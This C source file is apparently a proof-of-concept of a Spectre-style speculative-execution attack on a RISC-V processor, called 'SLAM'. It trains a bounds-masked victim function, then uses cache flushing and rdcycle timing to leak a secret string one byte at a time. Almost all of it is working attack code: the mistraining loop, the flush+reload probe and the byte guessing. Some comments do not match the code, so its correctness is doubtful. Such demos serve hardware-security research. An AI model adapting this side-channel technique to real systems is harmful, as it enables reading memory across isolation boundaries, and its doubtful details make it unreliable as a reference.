#include <stdio.h>
#include <stdint.h>
#include "encoding.h"
#include "cache.h"

#define NUM_TRAIN 6
#define NUM_ROUNDS 1
#define SAME_ATTACK_ROUNDS 10
#define SECRET_LEN 85
#define CACHE_THRESHOLD 50

uint64_t array1_size = 16;
uint8_t padding1[64];
uint8_t array1[160] = {
    1,2,3,4,5,6,7,8,
    9,10,11,12,13,14,15,16
};
uint8_t padding2[64];
uint8_t array2[256 * L1_BLOCK_SZ_BYTES];
char* secretStr = "!\"#ThisIsTheSecretString:)abcdefghijklmnopqrtsuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!£$%&?*";

/**
 * Finds the top two indices with the highest values in an array.
 */
void findTopTwo(uint64_t* inputArray, uint64_t inputSize, uint8_t* outputIdxArray, uint64_t* outputValArray) {
    // Initialize output arrays
    outputValArray[0] = 0;
    outputValArray[1] = 0;
    outputIdxArray[0] = 0;
    outputIdxArray[1] = 0;

    for (uint64_t i = 0; i < inputSize; ++i) {
        if (inputArray[i] > outputValArray[0]) {
            outputValArray[1] = outputValArray[0];
            outputValArray[0] = inputArray[i];
            outputIdxArray[1] = outputIdxArray[0];
            outputIdxArray[0] = (uint8_t)i;
        } else if (inputArray[i] > outputValArray[1]) {
            outputValArray[1] = inputArray[i];
            outputIdxArray[1] = (uint8_t)i;
        }
    }
}

/**
 * Victim function for SLAM (Spectre based on Linear Address Masking).
 *
 * The idea: we mask the index to ensure it's in-bound, but speculation might 
 * use the original (unmasked) index before the mask is resolved.
 */
void victimFunction(uint64_t idx) {
    uint64_t temp = 0; 
    // Linear mask: assume array1_size is a power of two
    uint64_t masked_idx = idx & (array1_size - 1UL);

    // Some floating point divisions to cause a speculation window
    asm("fcvt.s.lu	fa4, %[in]\n"
        "fcvt.s.lu	fa5, %[inout]\n"
        "fdiv.s	fa5, fa5, fa4\n"
        "fdiv.s	fa5, fa5, fa4\n"
        "fdiv.s	fa5, fa5, fa4\n"
        "fdiv.s	fa5, fa5, fa4\n"
        "fcvt.lu.s	%[out], fa5, rtz\n"
        : [out] "=r" (array1_size)
        : [inout] "r" (array1_size), [in] "r" (temp)
        : "fa4", "fa5");

    // Under correct, non-speculative conditions, this uses masked_idx:
    uint8_t val = array1[masked_idx];
    // Speculatively might have used idx (potential OOB)
    uint8_t secret_leaked_byte = array2[val * L1_BLOCK_SZ_BYTES];
    
    printf("%c\n", secret_leaked_byte);

    (void)secret_leaked_byte;
    temp = rdcycle(); 
}

int main(void) {
    uint64_t attackIdx = (uint64_t)(secretStr - (char*)array1);
    uint64_t startTime, duration, inputIdx, randomIdx;
    uint8_t temp = 0;
    static uint64_t results[256];

    for(uint64_t i = 0; i < SECRET_LEN; ++i) {
        for(uint64_t j = 0; j < 256; ++j) {
            results[j] = 0;
        }

        for(uint64_t round = 0; round < SAME_ATTACK_ROUNDS; ++round) {
            // Flush the array2 to ensure no cached data initially
            flushCache((uint64_t)array2, sizeof(array2));

            for(int64_t k = ((NUM_TRAIN + 1 + (round & 1)) * NUM_ROUNDS) - 1; k >= 0; --k) {
                randomIdx = round % array1_size;
                inputIdx = ((k % (NUM_TRAIN + 1 + (round & 1))) - 1) & ~0xFFFF;
                inputIdx = (inputIdx | (inputIdx >> 16));
                inputIdx = randomIdx ^ (inputIdx & (attackIdx ^ randomIdx));

                // Introduce some no-ops for speculation window
                for(uint64_t l = 0; l < 30; ++l) {
                    asm("");
                }

                victimFunction(inputIdx);
            }

            // Measure timing for each possible byte in array2
            for (uint64_t m = 0; m < 256; ++m) {
                volatile uint8_t dummy;
                startTime = rdcycle();
                dummy = array2[m * L1_BLOCK_SZ_BYTES];
                duration = (rdcycle() - startTime);

                if (duration < CACHE_THRESHOLD) {
                    results[m] += 1;
                }
            }
        }

        // Find the two most likely candidates
        uint8_t bestGuess[2];
        uint64_t bestHits[2];
        findTopTwo(results, 256, bestGuess, bestHits);

        printf("SLAM leak attempt: m[%p] = expected(%c) guess(hits,dec,char) 1.(%lu, %d, %c) 2.(%lu, %d, %c)\n", 
            (uint8_t*)(array1 + attackIdx), secretStr[i], 
            bestHits[0], bestGuess[0], bestGuess[0], 
            bestHits[1], bestGuess[1], bestGuess[1]);

        ++attackIdx;
    }

    return 0;
}

